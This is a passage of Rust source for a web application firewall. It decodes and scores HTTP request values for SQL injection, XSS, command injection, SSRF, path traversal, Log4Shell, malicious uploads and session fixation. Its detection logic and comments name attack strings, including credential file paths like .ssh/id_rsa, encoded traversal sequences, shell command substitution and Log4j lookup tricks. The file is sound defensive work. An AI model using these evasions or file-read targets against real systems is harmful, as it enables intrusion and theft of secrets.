//! Walks a request (path, query, headers, cookies, body) and scores every value.

use std::cell::{Cell, RefCell};
use std::collections::hash_map::RandomState;
use std::collections::{BTreeMap, HashSet};
use std::hash::BuildHasher;
use std::time::{Duration, Instant};

use regex::{Regex, RegexSet, RegexSetBuilder};

use crate::body;
use crate::decode::{
    base64_variants, decode, decode_keep_case, fold_html_lookalikes, fold_path_lookalikes,
    percent_decode, utf7_decode,
};
use crate::indicators::AttackClass::{self, *};
use crate::indicators::indicators;
use crate::lexicon::Lexicons;
use crate::multipart;
use crate::shell::Shell;
use crate::sql::Sql;
use crate::ssrf::Ssrf;

/// Values inspected per request at most (JSON strings inspected clean once are not
/// counted again). Past this the request gets an
/// `inspection_limit` finding (7), so padding can't push a payload past an uninspected
/// limit, and an attacker can't buy unbounded work with one request.
const MAX_VALUES: usize = 8192;

/// Values longer than this are inspected in overlapping windows of this size (up to
/// `Inspector::max_value_len`): decoding and the analysers stay as fast per byte as on
/// short values, and a payload behind padding is still inspected.
const WINDOW: usize = 8 * 1024;

/// Bytes shared by neighbouring windows, so a payload shorter than this that straddles a
/// window boundary is whole in one of them.
const OVERLAP: usize = 1024;

/// Time a request may spend in the combined indicator automaton before its remaining
/// values are matched one regex at a time (see [`Inspector::indicator_matches`]).
const SET_BUDGET: Duration = Duration::from_millis(2);

/// JSON nested deeper than this is not walked; the request gets a `json_too_deep`
/// finding (7) instead of being skipped silently.
const MAX_JSON_DEPTH: usize = 64;

/// Per-request inspection state.
#[derive(Default)]
struct Scan {
    values: Cell<usize>,
    set_time: Cell<Duration>,
    limited: Cell<bool>,
    too_deep: Cell<bool>,
    /// A value longer than `max_value_len` or a body longer than `max_body_len`: the rest
    /// was not inspected.
    oversize: Cell<Option<&'static str>>,
    /// Keyed hashes of JSON strings already inspected clean in this request: bulk JSON
    /// repeats its keys (and many values) thousands of times, and a JSON string's result
    /// doesn't depend on where it appears, so each is inspected once. The hash key is
    /// random per process, so a collision can't be forged to skip a payload.
    json_clean: RefCell<HashSet<u64>>,
}

/// Indicators that are ignored in the URL path.
const PATH_EXEMPT: &[&str] = &["dom_sink", "js_cookie_domain", "generic_event_handler"];

/// Locations that carry URLs or addresses of the client itself, often internal ones
/// (`http://localhost:3000` in development, `10.0.0.7` behind a proxy): no SSRF or
/// remote-file-inclusion analysis there.
const NO_URL_ANALYSIS: &[&str] = &[
    "path",
    "header:referer",
    "header:origin",
    "header:x-forwarded-for",
    "header:x-real-ip",
    "header:true-client-ip",
    "header:x-client-ip",
    "header:forwarded",
];

/// One suspicious value.
#[derive(Debug, Clone)]
pub struct Finding {
    pub class: AttackClass,
    /// 0–10.
    pub score: f64,
    /// Where it was found: `path`, `query:id`, `body:comment`, `json.user.name`, `header:user-agent`, `cookie:sid`.
    pub location: String,
    pub indicators: Vec<&'static str>,
    /// Decoded value (truncated) for the log.
    pub sample: String,
}

#[derive(Debug, Clone, Default)]
pub struct Inspection {
    pub findings: Vec<Finding>,
}

impl Inspection {
    pub fn max_score(&self) -> f64 {
        self.findings.iter().map(|f| f.score).fold(0.0, f64::max)
    }

    pub fn top(&self) -> Option<&Finding> {
        self.findings
            .iter()
            .max_by(|a, b| a.score.total_cmp(&b.score))
    }
}

/// What the inspector needs from a request.
pub struct HttpRequest<'a> {
    pub path_and_query: &'a str,
    pub headers: &'a [(String, String)],
    pub content_type: Option<&'a str>,
    pub body: &'a [u8],
}

pub struct Inspector {
    hasher: RandomState,
    set: RegexSet,
    /// The same indicators one by one, for random-looking input (see `indicator_matches`).
    each: Vec<Regex>,
    meta: Vec<(AttackClass, &'static str, f64)>,
    jndi_only: Vec<bool>,
    comments: Regex,
    lookups: Regex,
    ua_locale: Regex,
    session_names: Regex,
    lexicons: Lexicons,
    shell: Shell,
    sql: Sql,
    ssrf: Ssrf,
    /// Findings below this score are dropped.
    pub min_score: f64,
    /// Longest value inspected (bytes). Values longer than 8 KiB are inspected in
    /// overlapping windows up to this length; the rest of a longer value is not
    /// inspected, and the request gets an `inspection_limit` finding (see `flag_oversize`).
    /// Text file uploads are inspected up to this length without that finding.
    pub max_value_len: usize,
    /// Body bytes inspected. Past this, a body that is not multipart is not inspected
    /// further and the request gets an `inspection_limit` finding (see `flag_oversize`).
    /// A multipart body is parsed whole: every field is inspected until the fields
    /// (not the files) reach this size, and every file is checked for server code.
    pub max_body_len: usize,
    /// Report input that was not inspected because of `max_value_len` or `max_body_len`
    /// as an `inspection_limit` finding (score 7). Without it, padding a value or a body
    /// past a limit hides a payload behind it.
    pub flag_oversize: bool,
}

impl Default for Inspector {
    fn default() -> Self {
        Self::new()
    }
}

impl Inspector {
    pub fn new() -> Self {
        let ind = indicators();
        // The set holds every indicator. With the default 2 MiB lazy-DFA cache it
        // thrashes and the regex crate falls back to its PikeVM, ~60x slower
        // (1.4 ms instead of ~20 µs per request). 16 MiB per thread leaves headroom
        // for the extra states that varied attack traffic creates.
        let set = RegexSetBuilder::new(ind.iter().map(|i| format!("(?s){}", i.pattern)))
            .dfa_size_limit(16 << 20)
            .build()
            .expect("WAF patterns compile");
        Self {
            hasher: RandomState::new(),
            set,
            each: ind
                .iter()
                .map(|i| Regex::new(&format!("(?s){}", i.pattern)).expect("WAF patterns compile"))
                .collect(),
            meta: ind.iter().map(|i| (i.class, i.name, i.weight)).collect(),
            jndi_only: ind
                .iter()
                .map(|i| matches!(i.class, JndiInjection | JavaInjection))
                .collect(),
            lexicons: Lexicons::new(),
            shell: Shell::new(),
            sql: Sql::new(),
            ssrf: Ssrf::new(),
            comments: Regex::new(r"(?s)/\*.*?\*/").unwrap(),
            // a language tag alone in a User-Agent comment: `(Linux; U; Android 4.4.2; id; …)`
            // (never after `$`: `$(id)` is command substitution)
            ua_locale: Regex::new(r"(?i)(^|[^$])([(;]\s*)[a-z]{2}(?:[-_][a-z]{2,4})?(\s*[;)])")
                .unwrap(),
            // session-id parameter names of common frameworks (CRS 943110 / 943120)
            session_names: Regex::new(
                r"^(jsessionid|jservsession|jwsession|aspsessionid|asp\.net_sessionid|zend_session_id|phpsessid|phpsession|play_session|weblogicsession|wlsession|rack\.session|laravel_session|next-auth\.session-token|meteor_login_token|session[-_]?id|sails\.sid|shiny-token|_session_id|_flask_session|_rails_session|cfid|cfsid|cftoken|connect\.sid|cakephp|ci_session|koa[.:]sess)$",
            )
            .unwrap(),
            // Log4j lookup obfuscation: ${lower:j} ${upper:j} ${::-j} ${env:X:-j} → j
            lookups: Regex::new(r"\$\{\s*(?:lower|upper|::-|[a-z]*:[^:}$]*:-)\s*:?([^}$]*)\}")
                .unwrap(),
            min_score: 3.0,
            max_value_len: 64 * 1024,
            max_body_len: 64 * 1024,
            flag_oversize: true,
        }
    }

    /// Scores one value. `form` = `+` means space (query strings, form bodies).
    /// Returns the strongest finding, if any reaches `min_score`.
    /// A value longer than `max_value_len` without a stronger finding gives the
    /// `inspection_limit` finding (when `flag_oversize` is on).
    pub fn inspect_value(&self, location: &str, raw: &str, form: bool) -> Option<Finding> {
        let scan = Scan::default();
        let found = self.inspect_value_filtered(&scan, location, raw, form, false);
        if !self.flag_oversize || scan.oversize.get().is_none() {
            return found;
        }
        let limit = Finding {
            class: ProtocolViolation,
            score: 7.0,
            location: location.to_string(),
            indicators: vec!["inspection_limit"],
            sample: format!("value longer than {} bytes", self.max_value_len),
        };
        match found {
            Some(f) if f.score >= limit.score => Some(f),
            _ => Some(limit),
        }
    }

    /// `inspect_value` within one request's budget.
    fn scan_value(&self, scan: &Scan, location: &str, raw: &str, form: bool) -> Option<Finding> {
        self.inspect_value_filtered(scan, location, raw, form, false)
    }

    /// Indexes of the indicators matching `v`. The combined `RegexSet` is fastest on
    /// ordinary text, but on random-looking input (many distinct characters, little
    /// repetition) its lazy DFA keeps building new states and falls back to a slow engine:
    /// ~8 ms for 8 KiB of random punctuation instead of ~20 µs for prose. One regex at a
    /// time stays under ~0.4 ms there. Both give the same matches; only the speed differs.
    fn indicator_matches(&self, v: &str, per_regex: bool, jndi_only: bool) -> Vec<usize> {
        if per_regex {
            self.each
                .iter()
                .enumerate()
                .filter(|(i, r)| (!jndi_only || self.jndi_only[*i]) && r.is_match(v))
                .map(|(i, _)| i)
                .collect()
        } else {
            self.set.matches(v).into_iter().collect()
        }
    }

    /// Scores a value up to `max_value_len`, in overlapping windows when it is long, and
    /// returns the strongest finding. A longer value marks the request as oversize.
    fn inspect_value_filtered(
        &self,
        scan: &Scan,
        location: &str,
        raw: &str,
        form: bool,
        jndi_only: bool,
    ) -> Option<Finding> {
        let inspected = truncate(raw, self.max_value_len);
        if inspected.len() < raw.len() {
            scan.oversize.set(Some("value"));
        }
        windows(inspected)
            .into_iter()
            .filter_map(|w| self.score_window(scan, location, w, form, jndi_only))
            .max_by(|a, b| a.score.total_cmp(&b.score))
    }

    /// File content: inspected up to `max_value_len`; a longer file is not oversize (files
    /// are stored, not parsed as parameters, and uploads are often large).
    fn scan_file_text(&self, scan: &Scan, location: &str, text: &str) -> Option<Finding> {
        self.scan_value(scan, location, truncate(text, self.max_value_len), false)
    }

    /// Scores one value of at most about `WINDOW` bytes; each counts against the
    /// request's value budget.
    fn score_window(
        &self,
        scan: &Scan,
        location: &str,
        raw: &str,
        form: bool,
        jndi_only: bool,
    ) -> Option<Finding> {
        if raw.is_empty() {
            return None;
        }
        let n = scan.values.get();
        if n >= MAX_VALUES {
            scan.limited.set(true);
            return None;
        }
        scan.values.set(n + 1);
        // User-Agent locale tokens: `; id;` is Indonesian in UC Browser and BlackBerry
        // agents, not a chained `id` command
        let ua_cleaned;
        let raw = if location == "header:user-agent" {
            ua_cleaned = self.ua_locale.replace_all(raw, "$1$2$3");
            ua_cleaned.as_ref()
        } else {
            raw
        };
        let decoded = decode(raw, form);
        let mut scores: BTreeMap<AttackClass, (f64, Vec<&'static str>)> = BTreeMap::new();
        let mut add = |class, name, w| {
            let e = scores.entry(class).or_insert((0.0, Vec::new()));
            if !e.1.contains(&name) {
                e.0 += w;
                e.1.push(name);
            }
        };

        let mut resolved = decoded.clone();
        for _ in 0..3 {
            let next = self.lookups.replace_all(&resolved, "$1").into_owned();
            if next == resolved {
                break;
            }
            resolved = next;
        }
        let mut variants = vec![
            self.comments.replace_all(&decoded, "").into_owned(),
            self.comments.replace_all(&decoded, " ").into_owned(),
            resolved,
            decoded.clone(),
        ];
        // Payloads hidden in base64 (whole values or fragments).
        let kept_case = decode_keep_case(raw, form);
        // UTF-7 (`+ADw-script+AD4-`)
        if let Some(u7) = utf7_decode(&kept_case) {
            variants.push(decode(&u7, false));
        }
        // look-alike brackets and quotes folded to HTML syntax (`＜script＞`, `¼script¾`)
        if let Some(folded) = fold_html_lookalikes(&decoded) {
            variants.push(folded);
        }
        // look-alike dots and slashes and `0x2e`-style hex folded to a path (`．．∕`)
        if let Some(folded) = fold_path_lookalikes(&decoded) {
            variants.push(folded);
        }
        // browsers drop tabs and newlines inside URL schemes (`ja&tab;vascript:`)
        let squeezed: String = kept_case
            .chars()
            .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
            .collect::<String>()
            .to_lowercase();
        let split_scheme = ["javascript:", "vbscript:"]
            .iter()
            .any(|s| squeezed.contains(s) && !decoded.contains(s));
        if split_scheme {
            add(CrossSiteScripting, "js_uri_split", 7.0);
        }
        let n_plain = variants.len();
        variants.extend(base64_variants(&kept_case));
        let per_regex = scan.set_time.get() >= SET_BUDGET || variants.iter().any(|v| diverse(v));
        let started = (!per_regex).then(Instant::now);
        for (vi, v) in variants.iter().enumerate() {
            // identical variants (no comments, no lookups: the usual case) are scanned once
            if variants[..vi].contains(v) {
                continue;
            }
            for idx in self.indicator_matches(v, per_regex, jndi_only) {
                if jndi_only && !self.jndi_only[idx] {
                    continue;
                }
                let (class, name, w) = self.meta[idx];
                // JS property names and `onx=` alone in a URL path are page names
                // (`/javascript-manual/document.cookie`), not code
                if location == "path" && PATH_EXEMPT.contains(&name) {
                    continue;
                }
                // the client's own address or origin (`Origin: http://localhost:3000`):
                // URL indicators don't apply there
                if matches!(class, Ssrf | RemoteFileInclusion)
                    && location.starts_with("header:")
                    && NO_URL_ANALYSIS.contains(&location)
                {
                    continue;
                }
                add(class, name, w);
                // a header never holds shell command substitution legitimately
                // (Shellshock-era payloads in User-Agent, Referer, X-Forwarded-For)
                if name.starts_with("backtick_command") && location.starts_with("header:") {
                    add(CommandInjection, "header_command_substitution", 4.0);
                }
            }
        }
        if let Some(t) = started {
            scan.set_time.set(scan.set_time.get() + t.elapsed());
        }
        // Word lists: decoded value, comment-stripped value and base64 decodings.
        let mut lexicon_inputs: Vec<&String> = vec![&decoded, &variants[0]];
        lexicon_inputs.extend(variants.iter().skip(n_plain));
        for v in lexicon_inputs {
            for (class, name, w) in self.lexicons.scan(location, v) {
                // other headers: only header-safe classes (Log4Shell, Java)
                if !jndi_only || class == JavaInjection {
                    add(class, name, w);
                    // the whole value is the path of an OS file (`/etc/passwd`,
                    // `.ssh/id_rsa`, `c:\boot.ini`): a file-read attempt. In prose the same
                    // path comes with words around it and stays at the list's weight.
                    if name == "lfi_os_file" && path_value(v) {
                        add(PathTraversal, "lfi_path_value", 4.0);
                    }
                }
            }
        }
        if !jndi_only {
            // SQL structure: string / numeric breakout, whole-value expressions,
            // database functions.
            for (name, w) in self.sql.scan(&decoded) {
                add(SqlInjection, name, w);
            }
            // Shell commands: newlines kept, they separate commands.
            if location != "path" {
                for (name, w) in self.shell.scan(&kept_case.to_lowercase()) {
                    add(CommandInjection, name, w);
                }
            }
            // URLs and host names: SSRF targets and remote file inclusion.
            // (the Referer is set by browsers; `http://localhost` there is development)
            if !NO_URL_ANALYSIS.contains(&location) {
                let param = location
                    .split_once(':')
                    .map(|(_, n)| n.rsplit('.').next().unwrap_or(n));
                for (name, w) in self.ssrf.scan(&decoded, param) {
                    let class = if name.starts_with("rfi_") {
                        RemoteFileInclusion
                    } else {
                        Ssrf
                    };
                    add(class, name, w);
                }
            }
            // Binary upload bodies legitimately contain NUL bytes; parameters never should.
            if location != "body"
                && (decoded.contains('\0') || raw.to_ascii_lowercase().contains("%00"))
            {
                add(PathTraversal, "null_byte", 7.0);
            }
            let lower_raw = raw.to_ascii_lowercase();
            // A traversal that only appears once the dots are decoded (`%2e`, double
            // encoding, overlong UTF-8, `%u` or look-alike characters, `0x2e`, entities) was
            // disguised on purpose: browsers and HTTP libraries never encode `.`, only `/`
            // and `\` (`..%2F`, which is why that alone stays weak). Base64 decodings are
            // left out: random tokens can contain `../` by chance.
            let plain = lower_raw.replace("%2f", "/").replace("%5c", "\\");
            let plain_traversal = plain.contains("../") || plain.contains("..\\");
            let decoded_traversal = variants[..n_plain]
                .iter()
                .any(|v| v.contains("../") || v.contains("..\\"));
            if decoded_traversal && !plain_traversal {
                add(PathTraversal, "disguised_traversal", 5.0);
            } else if [
                "%2e%2e", "%252e", "..%2f", "..%5c", "%c0%ae", "%c0%af", ".%2e", "%2e.",
            ]
            .iter()
            .any(|p| lower_raw.contains(p))
            {
                add(PathTraversal, "encoded_traversal", 3.0);
            }
            if decoded.contains("/*!") {
                add(SqlInjection, "versioned_comment", 4.0);
            } else if decoded.contains("/*") && decoded.contains("*/") {
                add(SqlInjection, "inline_comment", 2.0);
            }
        }

        let (class, (score, inds)) = scores.into_iter().max_by(|a, b| a.1.0.total_cmp(&b.1.0))?;
        let score = score.min(10.0);
        if score < self.min_score {
            return None;
        }
        Some(Finding {
            class,
            score,
            location: location.to_string(),
            indicators: inds,
            sample: truncate(&decoded, 160).to_string(),
        })
    }

    /// Inspects path, query parameters, cookies, user agent, referer, other headers
    /// (Log4Shell lookups only) and the body (form, JSON, XML, text, multipart).
    pub fn inspect(&self, req: &HttpRequest) -> Inspection {
        let scan = Scan::default();
        let mut out = Inspection::default();
        let mut push = |f: Option<Finding>| {
            if let Some(f) = f {
                out.findings.push(f);
            }
        };
        let (path, query) = match req.path_and_query.split_once('?') {
            Some((p, q)) => (p, Some(q)),
            None => (req.path_and_query, None),
        };
        push(self.scan_value(&scan, "path", path, false));
        let mut names: Vec<String> = Vec::new();
        if let Some(q) = query {
            for (k, v) in form_pairs(q) {
                names.push(decode_name(k).to_ascii_lowercase());
                push(self.scan_value(&scan, "query-name", k, true));
                push(self.scan_value(&scan, &format!("query:{}", decode_name(k)), v, true));
            }
        }
        for (name, value) in req.headers {
            let n = name.to_ascii_lowercase();
            match n.as_str() {
                "user-agent" | "referer" | "x-forwarded-host" | "x-original-url"
                | "x-rewrite-url"
                // applications log and reflect these (second-order SQLi, stored XSS)
                | "x-forwarded-for" | "x-real-ip" | "true-client-ip" | "x-client-ip"
                | "forwarded" | "origin" => {
                    push(self.scan_value(&scan, &format!("header:{n}"), value, false))
                }
                "cookie" => {
                    for part in value.split(';') {
                        let (k, v) = part.split_once('=').unwrap_or(("", part));
                        push(self.scan_value(&scan, &format!("cookie:{}", k.trim()), v.trim(), true));
                    }
                }
                _ => push(self.inspect_value_filtered(&scan, &format!("header:{n}"), value, false, true)),
            }
        }
        if !req.body.is_empty() {
            let ct = req.content_type.unwrap_or("").to_ascii_lowercase();
            let multipart = ct
                .starts_with("multipart/")
                .then(|| req.content_type.and_then(multipart::boundary))
                .flatten()
                .and_then(|b| self.inspect_multipart(&scan, req.body, &b, &mut names));
            match multipart {
                Some(found) => out.findings.extend(found),
                None if req.body.len() <= self.max_body_len => {
                    self.inspect_body(&scan, req.body, &ct, &mut names, &mut out.findings)
                }
                None => {
                    let head = &req.body[..self.max_body_len];
                    self.inspect_body(&scan, head, &ct, &mut names, &mut out.findings);
                    if file_type(&ct) {
                        // a raw file upload (`PUT` of an image, PDF, CSV): applications
                        // store it rather than parse parameters from it, so the rest isn't
                        // flagged; a binary file is checked whole for server code
                        let code = multipart::is_binary(req.body)
                            .then(|| multipart::embedded_code(req.body))
                            .flatten();
                        if let (Some(indicator), false) = (
                            code,
                            out.findings.iter().any(|f| f.class == MaliciousUpload),
                        ) {
                            out.findings.push(Finding {
                                class: MaliciousUpload,
                                score: 8.0,
                                location: "body".to_string(),
                                indicators: vec![indicator],
                                sample: String::new(),
                            });
                        }
                    } else {
                        scan.oversize.set(Some("body"));
                    }
                }
            }
        }
        if let Some(f) = self.session_fixation(&names, req.headers) {
            out.findings.push(f);
        }
        if scan.too_deep.get() {
            out.findings.push(Finding {
                class: ProtocolViolation,
                score: 7.0,
                location: "body".to_string(),
                indicators: vec!["json_too_deep"],
                sample: format!("JSON nested deeper than {MAX_JSON_DEPTH}"),
            });
        }
        if let (true, Some(what)) = (self.flag_oversize, scan.oversize.get()) {
            let (location, sample) = match what {
                "body" => (
                    "body",
                    format!("body longer than {} bytes", self.max_body_len),
                ),
                _ => (
                    "request",
                    format!("value longer than {} bytes", self.max_value_len),
                ),
            };
            out.findings.push(Finding {
                class: ProtocolViolation,
                score: 7.0,
                location: location.to_string(),
                indicators: vec!["inspection_limit"],
                sample,
            });
        }
        if scan.limited.get() {
            out.findings.push(Finding {
                class: ProtocolViolation,
                score: 7.0,
                location: "request".to_string(),
                indicators: vec!["inspection_limit"],
                sample: format!("more than {MAX_VALUES} values"),
            });
        }
        out
    }

    /// A body that is not multipart: decoded to text the way the application reads it
    /// (byte-order mark, declared charset, UTF-16 / UTF-32), then parsed by content type.
    /// Without a content type, or with one this function doesn't know, the body is still
    /// inspected: many frameworks parse JSON or form bodies whatever the declared type,
    /// so skipping the body would let one header switch the WAF off.
    fn inspect_body(
        &self,
        scan: &Scan,
        raw: &[u8],
        ct: &str,
        names: &mut Vec<String>,
        out: &mut Vec<Finding>,
    ) {
        let body = body::decode(raw, ct);
        if let Some((indicator, score)) = body.anomaly {
            let charset = body::charset(ct).unwrap_or_default();
            out.push(Finding {
                class: ProtocolViolation,
                score,
                location: "body".to_string(),
                indicators: vec![indicator],
                sample: truncate(&charset, 160).to_string(),
            });
        }
        let text = body.text.as_ref();
        if ct.starts_with("application/x-www-form-urlencoded") {
            for (k, v) in form_pairs(text) {
                names.push(decode_name(k).to_ascii_lowercase());
                out.extend(self.scan_value(scan, "body-name", k, true));
                out.extend(self.scan_value(scan, &format!("body:{}", decode_name(k)), v, true));
            }
        } else if ct.contains("json") {
            if !self.inspect_json(scan, text, names, out) {
                out.extend(self.scan_value(scan, "body", text, false));
            }
        } else if ct.contains("xml") || ct.starts_with("text/") || ct.starts_with("multipart/") {
            out.extend(self.scan_value(scan, "body", text, false));
        } else if !body.transcoded && multipart::is_binary(raw) {
            // a raw file upload (`PUT /shell.php`): only server code hidden in it
            if let Some(indicator) = multipart::embedded_code(raw) {
                out.push(Finding {
                    class: MaliciousUpload,
                    score: 8.0,
                    location: "body".to_string(),
                    indicators: vec![indicator],
                    sample: String::new(),
                });
            }
        } else {
            let t = text.trim_start();
            let json = (t.starts_with('{') || t.starts_with('['))
                && self.inspect_json(scan, text, names, out);
            if !json {
                out.extend(self.scan_value(scan, "body", text, false));
            }
        }
    }

    /// Walks `text` as JSON, collecting top-level keys for session-fixation detection.
    /// `false` if it doesn't parse.
    fn inspect_json(
        &self,
        scan: &Scan,
        text: &str,
        names: &mut Vec<String>,
        out: &mut Vec<Finding>,
    ) -> bool {
        match serde_json::from_str::<serde_json::Value>(text) {
            Ok(v) => {
                if let Some(m) = v.as_object() {
                    names.extend(m.keys().take(1000).map(|k| k.to_ascii_lowercase()));
                }
                self.walk_json(scan, &v, "json", out, 0);
                true
            }
            Err(_) => false,
        }
    }

    /// Inspects a multipart body part by part: field names, file names (upload checks),
    /// text content per field (JSON parts walked), binary files only for embedded
    /// server code, plus structural evasions. `None` if the body doesn't parse.
    fn inspect_multipart(
        &self,
        scan: &Scan,
        body: &[u8],
        boundary: &str,
        names: &mut Vec<String>,
    ) -> Option<Vec<Finding>> {
        let m = multipart::parse(body, boundary)?;
        if m.truncated {
            scan.oversize.set(Some("body"));
        }
        let mut out = Vec::new();
        let finding = |class, location: String, inds: Vec<(&'static str, f64)>, sample: &str| {
            let score: f64 = inds.iter().map(|(_, w)| w).sum::<f64>().min(10.0);
            (score >= self.min_score).then(|| Finding {
                class,
                score,
                location,
                indicators: inds.into_iter().map(|(n, _)| n).collect(),
                sample: truncate(sample, 160).to_string(),
            })
        };
        out.extend(finding(
            ProtocolViolation,
            "multipart".to_string(),
            m.anomalies.clone(),
            "",
        ));
        let mut field_bytes = 0usize;
        for p in &m.parts {
            // fields (not files) count against the body budget; past it, the remaining
            // fields are not inspected and the request is oversize
            if p.filename.is_none() {
                field_bytes += p.body.len();
                if field_bytes > self.max_body_len {
                    scan.oversize.set(Some("body"));
                    break;
                }
            }
            let field = truncate(&p.name, 64);
            names.push(field.to_ascii_lowercase());
            out.extend(self.scan_value(scan, "body-name", &p.name, false));
            let text = || String::from_utf8_lossy(p.body).into_owned();
            if let Some(file) = &p.filename {
                let mut inds: Vec<(&'static str, f64)> = Vec::new();
                // `filename*` is preferred, but a server may store `filename`: check both
                for name in std::iter::once(file).chain(p.alt_filename.iter()) {
                    out.extend(self.scan_value(scan, &format!("filename:{field}"), name, false));
                    let mut found = multipart::filename_indicators(name);
                    // files a site never accepts by upload (wp-config.php, .bashrc, config.yml)
                    let stored = format!("/{}", multipart::normalize_filename(name));
                    if self
                        .lexicons
                        .scan("path", &stored)
                        .iter()
                        .any(|(_, n, _)| *n == "restricted_file")
                    {
                        found.push(("upload_restricted_file", 7.0));
                    }
                    for f in found {
                        if !inds.iter().any(|(n, _)| *n == f.0) {
                            inds.push(f);
                        }
                    }
                }
                let shown = match &p.alt_filename {
                    Some(alt) => format!("{file} / {alt}"),
                    None => file.clone(),
                };
                if multipart::is_binary(p.body) {
                    if let Some(n) = multipart::embedded_code(p.body) {
                        inds.push((n, 8.0));
                    }
                } else {
                    out.extend(self.scan_file_text(scan, &format!("body:{field}"), &text()));
                }
                out.extend(finding(
                    MaliciousUpload,
                    format!("filename:{field}"),
                    inds,
                    &shown,
                ));
            } else if p
                .content_type
                .as_deref()
                .is_some_and(|c| c.contains("json"))
            {
                match serde_json::from_slice::<serde_json::Value>(p.body) {
                    Ok(v) => self.walk_json(scan, &v, &format!("json.{field}"), &mut out, 0),
                    Err(_) => {
                        out.extend(self.scan_value(scan, &format!("body:{field}"), &text(), false))
                    }
                }
            } else {
                out.extend(self.scan_value(scan, &format!("body:{field}"), &text(), false));
            }
        }
        Some(out)
    }

    /// A session-id parameter is how an attacker plants a known session on a victim
    /// (session fixation). Legitimate URL-rewritten sessions come from links on the
    /// same site, so the request is flagged only without a Referer or with one from
    /// another site.
    fn session_fixation(&self, names: &[String], headers: &[(String, String)]) -> Option<Finding> {
        let name = names.iter().find(|n| self.session_names.is_match(n))?;
        let header = |h: &str| {
            headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case(h))
                .map(|(_, v)| v.as_str())
        };
        let host = header("host").unwrap_or("").to_ascii_lowercase();
        let host = host.split(':').next().unwrap_or("");
        let indicator = match header("referer") {
            None => "session_id_parameter_without_referer",
            Some(r) => {
                let r = r.to_ascii_lowercase();
                let referer_host = r
                    .split_once("://")
                    .map(|(_, rest)| rest.split(['/', '?', '#']).next().unwrap_or(""))
                    .unwrap_or("");
                let referer_host = referer_host.rsplit('@').next().unwrap_or("");
                let referer_host = referer_host.split(':').next().unwrap_or("");
                if host.is_empty() || referer_host.ends_with(host) {
                    return None;
                }
                "session_id_parameter_foreign_referer"
            }
        };
        Some(Finding {
            class: SessionFixation,
            score: 8.0,
            location: format!("param-name:{name}"),
            indicators: vec![indicator],
            sample: name.clone(),
        })
    }

    fn walk_json(
        &self,
        scan: &Scan,
        v: &serde_json::Value,
        path: &str,
        out: &mut Vec<Finding>,
        depth: usize,
    ) {
        // Every string and key is walked until the request's value budget (MAX_VALUES)
        // runs out; a per-level cap used to skip item 1 001 onwards silently.
        if depth > MAX_JSON_DEPTH {
            scan.too_deep.set(true);
            return;
        }
        let scalar = |x: &serde_json::Value| {
            matches!(
                x,
                serde_json::Value::Number(_) | serde_json::Value::Bool(_) | serde_json::Value::Null
            )
        };
        match v {
            serde_json::Value::String(s) => self.scan_json_string(scan, path, s, out),
            serde_json::Value::Array(a) => {
                for (i, x) in a.iter().enumerate() {
                    if scan.limited.get() {
                        break;
                    }
                    if !scalar(x) {
                        self.walk_json(scan, x, &format!("{path}[{i}]"), out, depth + 1);
                    }
                }
            }
            serde_json::Value::Object(m) => {
                for (k, x) in m {
                    if scan.limited.get() {
                        break;
                    }
                    self.scan_json_string(scan, &format!("{path}-key"), k, out);
                    if !scalar(x) {
                        self.walk_json(scan, x, &format!("{path}.{k}"), out, depth + 1);
                    }
                }
            }
            _ => {}
        }
    }
}

/// Long and made of many different characters: the shape that makes the combined
/// indicator automaton slow (prose of the same length uses far fewer characters).
impl Inspector {
    /// One JSON key or string value, inspected once per request (see `Scan::json_clean`).
    fn scan_json_string(&self, scan: &Scan, location: &str, s: &str, out: &mut Vec<Finding>) {
        let h = self.hasher.hash_one(s);
        if scan.json_clean.borrow().contains(&h) {
            return;
        }
        match self.scan_value(scan, location, s, false) {
            Some(f) => out.push(f),
            None => {
                scan.json_clean.borrow_mut().insert(h);
            }
        }
    }
}

/// A value that is one file path and nothing else: no whitespace, starting like an
/// absolute, home, relative or drive path, or a `file:` URL.
fn path_value(v: &str) -> bool {
    let v = v.trim();
    let b = v.as_bytes();
    v.len() >= 4
        && !v.chars().any(char::is_whitespace)
        && (v.starts_with('/')
            || v.starts_with('\\')
            || v.starts_with("~/")
            || v.starts_with("./")
            || v.starts_with("../")
            || v.starts_with('.')
            || v.starts_with("file:")
            || (b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'/' | b'\\')))
}

fn diverse(v: &str) -> bool {
    if v.len() < 256 {
        return false;
    }
    let mut seen = [false; 256];
    let mut distinct = 0;
    for b in v.bytes() {
        if !seen[b as usize] {
            seen[b as usize] = true;
            distinct += 1;
            if distinct >= 40 {
                return true;
            }
        }
    }
    false
}

fn truncate(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    &s[..floor_char(s, max)]
}

/// Content types of files rather than parameters (lower case). A JSON or XML flavour
/// (`application/vnd.api+json`) is parameters.
fn file_type(ct: &str) -> bool {
    let t = ct.split(';').next().unwrap_or("").trim();
    if t.contains("json") || t.contains("xml") {
        return false;
    }
    ["image/", "audio/", "video/", "font/", "application/vnd."]
        .iter()
        .any(|p| t.starts_with(p))
        || [
            "application/octet-stream",
            "application/pdf",
            "application/zip",
            "application/gzip",
            "application/x-gzip",
            "application/x-tar",
            "application/x-7z-compressed",
            "application/wasm",
            "text/csv",
        ]
        .contains(&t)
}

/// `s` cut into windows of at most `WINDOW` bytes that overlap by up to `OVERLAP` bytes.
/// A later window starts after a whitespace in the overlap when there is one, so it
/// begins at a word rather than in the middle of one.
fn windows(s: &str) -> Vec<&str> {
    if s.len() <= WINDOW {
        return vec![s];
    }
    let mut out = Vec::new();
    let mut start = 0;
    loop {
        let end = floor_char(s, (start + WINDOW).min(s.len()));
        out.push(&s[start..end]);
        if end >= s.len() {
            return out;
        }
        let mut next = floor_char(s, end - OVERLAP);
        if let Some((i, c)) = s[next..end].char_indices().find(|(_, c)| c.is_whitespace()) {
            next += i + c.len_utf8();
        }
        // always make progress, whatever the characters
        start = if next > start { next } else { end };
    }
}

fn floor_char(s: &str, mut i: usize) -> usize {
    while !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

fn form_pairs(s: &str) -> impl Iterator<Item = (&str, &str)> {
    s.split('&')
        .filter(|p| !p.is_empty())
        .map(|p| p.split_once('=').unwrap_or((p, "")))
}

fn decode_name(k: &str) -> String {
    let d = percent_decode(k, true);
    truncate(&d, 64).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn windows_cover_every_byte_with_overlap() {
